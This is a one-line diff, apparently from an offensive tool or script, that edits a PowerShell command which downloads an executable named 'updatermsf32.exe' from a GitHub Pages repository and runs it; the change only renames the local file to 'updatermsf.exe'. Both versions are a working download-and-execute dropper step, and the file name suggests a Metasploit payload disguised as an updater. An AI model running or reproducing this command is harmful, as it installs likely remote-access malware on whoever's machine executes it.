@@ -1,1 +1,1 @@
-ExecuteCmd -user -cmd powershell -c "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://github.com/MJVhack/MJVhack.github.io/raw/refs/heads/main/updatermsf32.exe','updater.exe'); Start-Process 'updater.exe'"
+ExecuteCmd -user -cmd powershell -c "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://github.com/MJVhack/MJVhack.github.io/raw/refs/heads/main/updatermsf32.exe','updatermsf.exe'); Start-Process 'updatermsf.exe'"
